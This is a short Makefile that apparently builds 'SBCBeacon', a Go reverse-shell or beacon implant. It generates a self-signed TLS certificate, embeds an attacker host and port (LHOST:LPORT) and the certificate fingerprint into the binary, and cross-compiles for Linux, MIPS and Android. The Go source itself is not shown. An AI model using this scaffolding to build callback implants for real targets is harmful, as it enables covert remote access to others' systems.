BUILD=go build
OUT_LINUX=SBCBeacon
SRC=main.go
SRV_KEY=server.key
SRV_PEM=server.pem
LINUX_LDFLAGS=--ldflags "-X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=$$(openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)"

all: clean depends shell

depends:
	openssl req -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_PEM}
	cat ${SRV_KEY} >> ${SRV_PEM}

linux:
	GOOS=linux GOARCH=amd64 ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_LINUX} ${SRC}

mips:
	GOOS=linux GOARCH=mips ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_LINUX} ${SRC}


android:
	GOOS=android GOARCH=arm GOARM=7 ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_LINUX} ${SRC}

clean:
	rm -f ${SRV_KEY} ${SRV_PEM} ${OUT_LINUX}
